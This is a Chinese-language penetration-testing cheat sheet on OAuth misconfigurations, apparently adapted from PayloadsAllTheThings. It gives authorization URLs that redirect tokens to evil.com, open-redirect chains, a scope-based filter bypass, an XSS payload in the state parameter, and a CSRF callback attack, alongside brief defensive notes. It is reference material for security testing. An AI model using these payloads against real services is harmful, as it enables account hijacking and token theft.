# OAuth Misconfiguration - OAuth配置错误

[SEARCH_KEYWORDS]
漏洞类型: OAuth Misconfiguration OAuth配置错误 OAuth漏洞
攻击类型: Account Hijacking Token Theft Authentication Bypass CSRF
关键词: OAuth access_token authorization_code redirect_uri state scope
流程: Authorization Code Implicit Flow Client Credentials
技术: redirect_uri Manipulation State Parameter CSRF Token Leakage

[CONTENT]

## OAuth配置错误概述

OAuth是广泛使用的授权框架，允许第三方应用访问用户数据而不暴露用户凭证。不当配置和实现可能导致严重安全漏洞。

## 通过referer窃取Token

如果有HTML注入但无法XSS，站点有OAuth实现，可设置img标签到服务器，登录后窃取OAuth token。

## 通过redirect_uri获取Token

### 重定向到受控域名

```powershell
https://example.com/signin/authorize?redirect_uri=https://evil.com
https://example.com/signin/authorize?redirect_uri=https://localhost.evil.com
```

### 重定向到接受的开放URL

```powershell
https://example.com/oauth2/authorize?redirect_uri=https://apps.facebook.com/attacker/
https://example.com/oauth20_authorize.srf?redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```

### 绕过过滤器

有时需要修改scope为无效值绕过redirect_uri过滤：

```powershell
https://example.com/admin/oauth/authorize?scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri执行XSS

```powershell
https://example.com/oauth/v1/authorize?redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth私钥泄露

Android/iOS应用可反编译获取OAuth私钥。

## 授权码规则违反

授权码只能使用一次。如果多次使用，服务器应拒绝请求并撤销之前颁发的所有令牌。

## 跨站请求伪造 (CSRF)

OAuth回调中未检查有效CSRF token的应用易受攻击。

攻击流程：
1. 初始化OAuth流程
2. 拦截回调URL: `https://example.com/callback?code=AUTHORIZATION_CODE`
3. 在CSRF攻击中使用此URL

### 防护

使用state参数传递绑定到用户认证状态的值。

## 常见OAuth漏洞

| 漏洞 | 描述 |
|------|------|
| redirect_uri验证不足 | 允许重定向到恶意域名 |
| state参数缺失 | CSRF攻击 |
| Token泄露 | 通过referer或日志 |
| 隐式流不当使用 | Token暴露在URL中 |
| 授权码重放 | 多次使用授权码 |

## 参考文档

原始来源: PayloadsAllTheThings/OAuth Misconfiguration/README.md